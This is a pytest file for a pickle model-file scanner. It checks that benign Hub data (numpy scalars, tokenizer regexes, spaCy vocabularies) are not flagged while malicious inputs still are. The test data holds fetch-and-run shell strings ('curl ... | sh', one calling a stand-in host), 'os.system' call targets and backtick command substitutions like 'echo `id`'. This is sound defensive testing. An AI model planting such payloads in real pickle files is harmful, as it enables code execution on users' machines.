"""False positives from the November 2026 Hub sweep, and the attacks next to them.

Each benign shape below was flagged HIGH on real Hub files (numpy scalars: 71,
tokenizer regexes: 8, spaCy/Counter word lists: 6). Each fix is paired with a
test that the attack it could mask is still caught.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from gadget_pickles import Call, build  # noqa: E402

from hayward import ModelFileScanner  # noqa: E402

ORDER = ["info", "low", "medium", "high", "critical"]


def worst(tmp_path: Path, data: bytes) -> str:
    p = tmp_path / "model.pkl"
    p.write_bytes(data)
    return max((f.severity.value for f in ModelFileScanner().scan_file(p)), key=ORDER.index, default="clean")


def flagged(level: str) -> bool:
    return level in ("low", "medium", "high", "critical")


DTYPE = Call("numpy.dtype", "f8", False, True)


def test_numpy_scalar_raw_bytes_are_not_a_command(tmp_path):
    # A float whose 8 raw bytes are all printable and include a backtick and a pipe.
    assert not flagged(worst(tmp_path, build(Call("numpy.core.multiarray.scalar", DTYPE, b":9`@ | a"))))


def test_numpy_scalar_handed_a_command_string_is_still_flagged(tmp_path):
    assert flagged(worst(tmp_path, build(Call("numpy.core.multiarray.scalar", DTYPE, "curl x | sh"))))


def test_regex_package_tokenizer_pattern_is_not_a_command(tmp_path):
    pattern = "'s|'t|'re|'ve|'m|'ll|'d| ?\\p{L}+| ?\\p{N}+| ?[^\\s\\p{L}\\p{N}]+|\\s+(?!\\S)|\\s+"
    assert not flagged(worst(tmp_path, build(Call("regex._regex.compile", pattern, 0))))


def test_counter_words_that_name_modules_are_data(tmp_path):
    assert not flagged(worst(tmp_path, build(Call("collections.Counter", {"nt": 3, "test": 2, "/": 9, "chea": 1}))))


def test_counter_with_a_dotted_target_or_command_is_still_flagged(tmp_path):
    assert flagged(worst(tmp_path, build(Call("collections.Counter", ["os.system"]))))
    assert flagged(worst(tmp_path, build(Call("collections.Counter", ["curl x | sh"]))))


def test_vocabulary_with_urls_is_data(tmp_path):
    words = [f"word{i}" for i in range(150)] + ["<http://news.example.com/a.html>", "``", "-LRB-"]
    assert not flagged(worst(tmp_path, build(Call("spacy.strings.StringStore", words))))


def test_short_list_with_a_url_is_still_flagged(tmp_path):
    assert flagged(worst(tmp_path, build(Call("some.loader.fetch", ["https://example.invalid/p"]))))


def test_penn_treebank_quote_tag_is_not_command_substitution(tmp_path):
    assert not flagged(worst(tmp_path, build(Call("spacy.matcher.matcher.unpickle_matcher", "TAG", "``", "''"))))


def test_backtick_command_substitution_is_still_flagged(tmp_path):
    assert flagged(worst(tmp_path, build(Call("some.module.run", "echo `id`"))))
    assert flagged(worst(tmp_path, build(Call("some.module.run", "a ` whoami` b"))))
    assert flagged(worst(tmp_path, build(Call("some.module.run", "x `/bin/id` y"))))
    for quoted in ('x `"id"` y', "x `'id'` y", "x `(id)` y", "x `{ id; }` y"):
        assert flagged(worst(tmp_path, build(Call("some.module.run", quoted)))), quoted


def test_binary_bytes_with_backticked_punctuation_are_data(tmp_path):
    # 8 printable raw bytes of a float array (protocol 2 spells bytes as
    # _codecs.encode(text, 'latin1')). Seen on a Hub sklearn pickle: no shell
    # runs `@`, a command name starts with a letter or a path.
    import pickle
    assert not flagged(worst(tmp_path, pickle.dumps({"w": b"S}+`@`;?"}, protocol=2)))


# Review findings: the false-positive fixes must stay tied to data containers.

def test_denied_target_nested_in_an_unknown_resolver_argument_is_flagged(tmp_path):
    assert flagged(worst(tmp_path, build(Call("some.module.resolve", {"target": "os.system"}))))
    assert flagged(worst(tmp_path, build(Call("some.module.resolve", ("os.system",)))))


def test_padded_command_list_to_an_unknown_callable_is_flagged(tmp_path):
    argv = [f"x{i}" for i in range(120)] + ["curl https://example.invalid/p | sh"]
    assert flagged(worst(tmp_path, build(Call("some.module.launch", argv))))


def test_bare_denied_module_name_with_padding_is_still_flagged(tmp_path):
    assert flagged(worst(tmp_path, build(Call("some.module.resolve", "os", "a", "b", "c", "d", "e"))))
